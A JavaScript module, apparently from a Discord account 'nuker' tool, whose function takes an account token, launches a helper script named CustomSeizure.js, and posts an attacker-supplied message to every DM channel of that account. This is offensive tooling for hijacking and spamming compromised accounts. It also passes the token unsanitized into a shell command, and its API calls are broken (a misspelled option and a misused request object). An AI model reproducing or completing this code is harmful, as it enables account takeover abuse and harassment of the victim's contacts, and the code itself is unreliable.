const { getheaders, validateToken } = require("../Settings/common")
const { execSync } = require("child_process")
const request = require("request")

function GANGDOTJS_START(token, Server_name, message_Content) {
    execSync(`node utilities/Plugins/Plugins_thread/CustomSeizure.js ${token}`)

    const headers = {'Authorization': token}
    const channelids = request.get({uir: "https://discord.com/api/v9/users/@me/channels", headers:getheaders(token)}, function(error,responce,body) {if(error) {console.log(error)}})
    for(channel in channelids) {
        try {
            request.post({uri:`https://discord.com/api/v9/channels/${channel['id']}/messages`,headers:headers,data:{"content": `${message_Content}`}}, function(error,responce,body) {
                if(error) {console.log(error)}
            })
        }
        catch(err) {
            console.log(err)
        }
    }
}